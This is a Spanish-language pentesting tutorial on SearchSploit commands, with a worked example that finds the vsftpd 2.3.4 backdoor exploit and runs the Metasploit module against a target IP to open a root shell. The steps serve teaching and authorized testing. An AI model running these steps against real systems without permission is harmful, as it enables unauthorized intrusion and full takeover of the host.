# Uso de SearchSploit y explotación de vulnerabilidades (Ejemplo: vsftpd 2.3.4)

## 1. ¿Qué es SearchSploit?
SearchSploit es una herramienta de línea de comandos incluida en **Exploit-DB** que permite buscar, consultar y copiar localmente exploits y PoCs (Proof of Concept) disponibles en la base de datos.

Es muy útil en **pentesting** para identificar exploits públicos relacionados con servicios o versiones específicas detectadas durante el reconocimiento.

## 2. Comandos básicos

### Buscar un exploit
```bash
searchsploit <nombre_servicio> <versión>
```
Ejemplo:
```bash
searchsploit vsftpd 2.3.4
```

### Mostrar detalles completos (path local y URL online)
```bash
searchsploit -w <nombre_servicio>
```

### Mostrar solo el path local en tu sistema
```bash
searchsploit -p <nombre_servicio>
```

### Copiar un exploit localmente
```bash
searchsploit -m <ID_o_path>
```
Ejemplo:
```bash
searchsploit -m 49757
```
Esto copiará el exploit desde la base de datos local a tu directorio actual.

### Buscar exploits con coincidencia exacta
```bash
searchsploit -e <palabra_clave>
```

### Actualizar la base de datos de SearchSploit
```bash
searchsploit -u
```

## 3. Caso práctico: vsftpd 2.3.4

### Paso 1: Búsqueda del exploit
```bash
searchsploit vsftpd 2.3.4
```
Salida esperada:
```
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
```

### Paso 2: Copiar el exploit a tu directorio
```bash
searchsploit -m 17491
```
Esto te dejará un archivo Ruby (`.rb`) que es un módulo para Metasploit.


## 4. Explotando vsftpd 2.3.4 con Metasploit

### Paso 1: Abrir Metasploit
```bash
msfconsole
```

### Paso 2: Cargar el módulo del exploit
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Paso 3: Configurar el objetivo
```bash
set RHOSTS <IP_objetivo>
set RPORT 21
```

### Paso 4: Ejecutar el exploit
```bash
exploit
```
Si es vulnerable, el exploit abrirá una shell en el puerto backdoor (generalmente 6200) y obtendrás acceso como root.



